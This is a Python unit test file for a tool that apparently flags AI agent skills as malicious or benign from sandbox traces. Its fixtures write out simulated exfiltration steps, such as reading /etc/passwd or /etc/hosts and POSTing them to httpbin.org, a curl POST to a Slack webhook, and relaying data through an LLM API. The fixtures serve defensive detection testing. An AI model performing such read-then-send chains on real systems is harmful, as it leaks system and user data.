from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from app.analyzer.rules import analyze_trace
from app.runner.models import (
    FileEvent,
    LLMEvent,
    NetworkEvent,
    ProcessEvent,
    ResourceUsage,
    SandboxExecution,
    ToolCallEvent,
    TraceArtifacts,
)


PROJECT_ROOT = Path(__file__).resolve().parents[1]
DATASETS_ROOT = PROJECT_ROOT / "datasets" / "skills"


def _tool_call(timestamp: str, tool_id: str, tool_name: str, tool_type: str, config: dict) -> ToolCallEvent:
    return ToolCallEvent(
        timestamp=timestamp,
        tool_id=tool_id,
        tool_name=tool_name,
        tool_type=tool_type,
        event="start",
        status=None,
        metadata={"config": config},
    )


def _execution(
    *,
    skill_dir: Path,
    file_events: list[FileEvent],
    network_events: list[NetworkEvent],
    process_events: list[ProcessEvent],
    tool_calls: list[ToolCallEvent],
    llm_events: list[LLMEvent] | None = None,
) -> SandboxExecution:
    artifacts_dir = tempfile.mkdtemp(prefix="clawguard-test-")
    return SandboxExecution(
        execution_id="test-exec",
        skill_path=str(skill_dir),
        skill_file="SKILL.md",
        sandbox_image="test-image",
        runtime_name="test-runtime",
        command=["python3"],
        exit_code=0,
        timed_out=False,
        stdout="",
        stderr="",
        trace_artifacts=TraceArtifacts(),
        file_events=file_events,
        network_events=network_events,
        process_events=process_events,
        tool_calls=tool_calls,
        llm_events=llm_events or [],
        data_flows=[],
        resource_usage=ResourceUsage(),
        artifacts_dir=artifacts_dir,
    )


class DynamicDecisionRegressionTests(unittest.TestCase):
    def test_malicious_sensitive_exfiltration_still_alerts(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="https://httpbin.org/post", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertIn("sensitive_file_read", result["detected_behaviors"])
        self.assertIn("read_then_exfiltration", result["detected_behaviors"])
        self.assertEqual(result["root_cause_detail"], "unsafe_dataflow_design")

    def test_staged_exfiltration_through_relay_artifact_still_alerts(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_indirect_exfil_temp_copy",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/passwd", action="read", raw="read"),
                FileEvent(timestamp="2026-01-01T00:00:02Z", path="runtime_output/staged-passwd.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:03Z", path="runtime_output/staged-passwd.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:04Z", address="https://httpbin.org/post", action="connect", raw="connect"),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:03Z", action="execve", command="cat runtime_output/staged-passwd.txt", raw="execve"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_source", "Read Sensitive Source", "read_file", {"path": "/etc/passwd"}),
                _tool_call("2026-01-01T00:00:02Z", "write_stage", "Write Stage File", "write_file", {"path": "runtime_output/staged-passwd.txt"}),
                _tool_call("2026-01-01T00:00:03Z", "read_stage", "Read Stage via Command", "run_command", {"shell": True, "command": "cat runtime_output/staged-passwd.txt"}),
                _tool_call("2026-01-01T00:00:04Z", "send_stage", "Send Stage", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertIn("sensitive_file_read", result["detected_behaviors"])
        self.assertTrue(result["primary_chain"])

    def test_unauthorized_outward_transfer_still_alerts_without_fake_sensitive_read(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:02Z", path="runtime_output/export.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:03Z", address="https://httpbin.org/post", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
                _tool_call("2026-01-01T00:00:01Z", "read_export", "Read Export", "read_file", {"path": "runtime_output/export.txt"}),
                _tool_call("2026-01-01T00:00:02Z", "send_export", "Send Export", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertEqual(result["root_cause_detail"], "overprivileged_tool_use")
        self.assertNotIn("sensitive_file_read", result["detected_behaviors"])
        self.assertNotIn("read_then_exfiltration", result["detected_behaviors"])

    def test_public_fetch_with_incidental_system_reads_is_not_flagged(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_public_fetch",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:00Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:01Z", address="https://example.com", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "fetch_public_page", "Fetch Public Page", "http_request", {"method": "GET", "url": "https://example.com"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "benign")
        self.assertNotIn("sensitive_file_read", result["detected_behaviors"])
        self.assertNotIn("read_then_exfiltration", result["detected_behaviors"])

    def test_public_relay_bundle_is_suppressed_as_benign(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_public_relay_bundle",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:00Z", path="public/bundle.txt", action="read", raw="read"),
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/bundle-stage.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:02Z", path="runtime_output/bundle-stage.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:03Z", address="https://httpbin.org/post", action="connect", raw="connect"),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="cat runtime_output/bundle-stage.txt", raw="execve"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_public_input", "Read Public Input", "read_file", {"path": "public/bundle.txt"}),
                _tool_call("2026-01-01T00:00:01Z", "write_stage", "Write Stage", "write_file", {"path": "runtime_output/bundle-stage.txt"}),
                _tool_call("2026-01-01T00:00:02Z", "read_stage", "Read Stage", "run_command", {"shell": True, "command": "cat runtime_output/bundle-stage.txt"}),
                _tool_call("2026-01-01T00:00:03Z", "send_stage", "Send Stage", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "benign")
        self.assertTrue(any(item["code"] == "public_fetch_to_public_upload" for item in result["suppression_factors"]))

    def test_helper_command_is_not_misclassified_as_unsafe(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_helper_command",
            file_events=[],
            network_events=[],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:01Z", action="execve", command="python tools/helper.py", raw="execve"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "run_helper", "Run Helper", "run_command", {"shell": True, "command": "python tools/helper.py"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "benign")
        self.assertEqual(result["root_cause_detail"], "unknown")

    def test_local_note_like_outputs_do_not_trigger_external_transfer_logic(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_local_note",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/note.txt", action="write", raw="write"),
            ],
            network_events=[],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "write_local_file", "Write Local File", "write_file", {"path": "runtime_output/note.txt"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "benign")
        self.assertEqual(result["risk_score"], 0)
        self.assertFalse(any(factor["code"] == "generated_artifact_external_transfer" for factor in result["triggered_factors"]))

    def test_helper_listing_with_local_only_sink_is_not_treated_as_external_transfer(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_helper_listing",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/public-list.txt", action="write", raw="write"),
            ],
            network_events=[],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:00Z", action="execve", command="ls public > runtime_output/public-list.txt", raw="execve"),
            ],
            tool_calls=[
                _tool_call(
                    "2026-01-01T00:00:00Z",
                    "run_helper_command",
                    "Run Helper Command",
                    "run_command",
                    {"shell": True, "command": "ls public > runtime_output/public-list.txt"},
                ),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertEqual(result["final_decision"], "benign")
        self.assertFalse(any(factor["code"] == "generated_artifact_external_transfer" for factor in result["triggered_factors"]))

    def test_public_fetch_followed_by_local_audit_note_stays_benign(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "benign" / "benign_public_fetch_audit_note",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/audit-note.txt", action="write", raw="write"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:00Z", address="https://httpbin.org/get", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "fetch_public_page", "Fetch Public Page", "http_request", {"method": "GET", "url": "https://httpbin.org/get"}),
                _tool_call("2026-01-01T00:00:01Z", "write_note", "Write Mirror Note", "write_file", {"path": "runtime_output/audit-note.txt"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="epg_with_filtering")

        self.assertEqual(result["final_decision"], "benign")
        self.assertFalse(any(factor["code"] == "overprivileged_outward_tool_action" for factor in result["triggered_factors"]))

    def test_http_request_url_is_preferred_over_unknown_network_sink(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://httpbin.org/post"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        sink = result["primary_chain"][-1]
        self.assertEqual(sink["node_type"], "network_endpoint")
        self.assertEqual(sink["label"], "https://httpbin.org/post")
        self.assertEqual(sink["endpoint_role"], "sink")
        self.assertEqual(sink["sink_resolution_status"], "resolved")

    def test_llm_provider_endpoint_becomes_relay_with_unknown_sink(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://api.openai.com/v1/responses"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertGreaterEqual(len(result["primary_chain"]), 3)
        llm_relay = result["primary_chain"][-2]
        sink = result["primary_chain"][-1]
        self.assertEqual(llm_relay["node_type"], "network_endpoint")
        self.assertEqual(llm_relay["label"], "https://api.openai.com/v1/responses")
        self.assertEqual(llm_relay["endpoint_role"], "relay")
        self.assertTrue(llm_relay["is_llm_provider"])
        self.assertEqual(llm_relay["llm_provider_name"], "openai")
        self.assertEqual(sink["node_type"], "network_endpoint")
        self.assertEqual(sink["label"], "unknown")
        self.assertEqual(sink["endpoint_role"], "sink")
        self.assertEqual(sink["sink_resolution_status"], "llm-mediated")

    def test_run_command_network_keeps_readable_endpoint_label(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect", pid="321"),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="curl -X POST https://hooks.slack.com/services/T000/B000/XXX", raw="execve", pid="321"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "curl -X POST https://hooks.slack.com/services/T000/B000/XXX"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        sink = result["primary_chain"][-1]
        self.assertEqual(sink["node_type"], "network_endpoint")
        self.assertEqual(sink["label"], "https://hooks.slack.com/services/T000/B000/XXX")

    def test_dns_domain_is_preferred_over_controlled_sink_ip(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(
                    timestamp="2026-01-01T00:00:02Z",
                    address="10.255.255.254:53",
                    action="connect",
                    raw="connect",
                    host="10.255.255.254",
                    port=53,
                    raw_address="10.255.255.254:53",
                    raw_host="10.255.255.254",
                    raw_port=53,
                    original_domain="api.example.com",
                    network_evidence_sources=["dns"],
                ),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="python uploader.py", raw="execve", pid="321"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "python uploader.py"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        sink = result["primary_chain"][-1]
        self.assertEqual(sink["node_type"], "network_endpoint")
        self.assertEqual(sink["label"], "domain: api.example.com")
        self.assertEqual(sink["sink_type"], "dns_only")
        self.assertEqual(sink["sink_raw_ip"], "10.255.255.254")
        self.assertEqual(sink["sink_resolution_status"], "resolved")

    def test_controlled_sink_ip_becomes_unresolved_network_label(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_unauthorized_network_transfer",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:00Z", path="runtime_output/export.txt", action="write", raw="write"),
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/export.txt", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(
                    timestamp="2026-01-01T00:00:02Z",
                    address="10.255.255.254:53",
                    action="connect",
                    raw="connect",
                    host="10.255.255.254",
                    port=53,
                    raw_address="10.255.255.254:53",
                    raw_host="10.255.255.254",
                    raw_port=53,
                ),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="python uploader.py", raw="execve", pid="321"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "write_export", "Write Export", "write_file", {"path": "runtime_output/export.txt"}),
                _tool_call("2026-01-01T00:00:01Z", "send_export", "Send Export", "run_command", {"shell": True, "command": "python uploader.py"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        sink = result["primary_chain"][-1]
        self.assertEqual(sink["node_type"], "network_endpoint")
        self.assertEqual(sink["label"], "network:unresolved")
        self.assertEqual(sink["sink_type"], "blackhole")
        self.assertTrue(sink["is_controlled_sink"])
        self.assertEqual(sink["sink_raw_ip"], "10.255.255.254")
        self.assertEqual(sink["sink_resolution_status"], "controlled")

    def test_sensitive_source_to_controlled_sink_stays_malicious(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(
                    timestamp="2026-01-01T00:00:02Z",
                    address="10.255.255.254:53",
                    action="connect",
                    raw="connect",
                    host="10.255.255.254",
                    port=53,
                    raw_address="10.255.255.254:53",
                    raw_host="10.255.255.254",
                    raw_port=53,
                    pid="321",
                ),
            ],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:02Z", action="execve", command="curl payload", raw="execve", pid="321"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "run_command", {"shell": True, "command": "curl payload"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertEqual(result["risk_score"], 80)
        self.assertIn("network_access", result["detected_behaviors"])
        self.assertIn("read_then_exfiltration", result["detected_behaviors"])
        self.assertEqual(result["sink_assessment"]["sink_display_label"], "network:unresolved")
        self.assertEqual(result["sink_assessment"]["sink_resolution_status"], "controlled")
        self.assertTrue(result["sink_assessment"]["is_controlled_sink"])
        self.assertEqual(result["sink_assessment"]["sink_domain"], "")
        self.assertEqual(result["sink_assessment"]["sink_url"], "")
        self.assertTrue(
            any(factor["code"] == "high_sensitivity_source_to_external_sink" for factor in result["triggered_factors"])
        )

    def test_sensitive_source_to_llm_mediated_unresolved_sink_stays_malicious(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_sensitive_exfil_direct",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="/etc/hosts", action="read", raw="read"),
            ],
            network_events=[
                NetworkEvent(timestamp="2026-01-01T00:00:02Z", address="unknown", action="connect", raw="connect"),
            ],
            process_events=[],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "read_sensitive_hosts", "Read Sensitive Hosts", "read_file", {"path": "/etc/hosts"}),
                _tool_call("2026-01-01T00:00:01Z", "send_hosts", "Send Hosts", "http_request", {"method": "POST", "url": "https://api.openai.com/v1/responses"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_plus_epg")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertEqual(result["risk_score"], 80)
        self.assertEqual(result["sink_assessment"]["semantics"], "LLM_MEDIATED_UNKNOWN_SINK")
        self.assertEqual(result["sink_assessment"]["sink_resolution_status"], "llm-mediated")
        self.assertEqual(result["sink_assessment"]["relay_label"], "https://api.openai.com/v1/responses")
        self.assertTrue(
            any(factor["code"] == "high_sensitivity_source_to_external_sink" for factor in result["triggered_factors"])
        )

    def test_templated_command_misuse_still_alerts(self) -> None:
        execution = _execution(
            skill_dir=DATASETS_ROOT / "malicious" / "malicious_command_exec_misuse",
            file_events=[
                FileEvent(timestamp="2026-01-01T00:00:01Z", path="runtime_output/user-message.txt", action="write", raw="write"),
            ],
            network_events=[],
            process_events=[
                ProcessEvent(timestamp="2026-01-01T00:00:00Z", action="execve", command="printf '%s' 'hello' > runtime_output/user-message.txt", raw="execve"),
            ],
            tool_calls=[
                _tool_call("2026-01-01T00:00:00Z", "render_user_message", "Render User Message", "run_command", {"shell": True, "command": "printf '%s' 'hello' > runtime_output/user-message.txt"}),
            ],
        )

        result = analyze_trace(execution, analysis_mode="rule_only")

        self.assertEqual(result["final_decision"], "malicious")
        self.assertEqual(result["root_cause_detail"], "unsafe_command_construction")


if __name__ == "__main__":
    unittest.main()
